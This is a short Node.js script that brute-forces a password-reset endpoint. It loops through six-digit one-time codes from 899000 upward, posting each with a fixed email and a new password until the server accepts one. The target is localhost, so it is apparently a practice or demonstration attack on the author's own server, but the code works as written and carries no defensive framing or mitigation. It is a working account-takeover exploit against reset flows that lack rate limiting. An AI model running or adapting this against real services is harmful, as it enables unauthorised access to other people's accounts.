const axios = require('axios');


const attack = async()=>{
for(let i = 899000 ; i<999999 ;i++){
let otp = i.toString();
let data = JSON.stringify({
  "email": "anish@gmail.com",
  "otp": otp,
  "newpassword": "ansih"
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'http://localhost:8000/reset',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};

try{
const response = await axios.request(config);
console.log(`${otp} success`,response.data)
break;
}catch(error){
    console.log(`${otp} failed`)
}

}
}
attack();